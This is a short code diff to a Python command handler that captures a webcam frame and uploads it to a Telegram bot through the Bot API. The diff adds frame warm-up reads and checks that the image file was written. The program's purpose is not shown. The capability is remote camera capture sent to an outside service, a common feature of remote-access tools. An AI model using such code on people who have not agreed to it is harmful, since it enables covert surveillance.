@@ -1936,14 +1936,20 @@ def _handle_capture_webcam(payload: dict) -> dict:
 
     cap = cv2.VideoCapture(0)
     try:
-        ok, frame = cap.read()
+        # Discard the first few frames — cameras need a moment to auto-expose.
+        ok, frame = False, None
+        for _ in range(5):
+            ok, frame = cap.read()
     finally:
         cap.release()  # always free the hardware lock so the green LED turns off
 
     if not ok or frame is None:
         return {"success": False, "error": "Webcam capture failed — no frame returned."}
 
-    cv2.imwrite(str(tmp_path), frame)
+    written = cv2.imwrite(str(tmp_path), frame)
+    if not written or not tmp_path.exists() or tmp_path.stat().st_size == 0:
+        return {"success": False, "error": "Webcam capture failed — could not write image file."}
+
     try:
         url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
         with open(tmp_path, "rb") as fh:
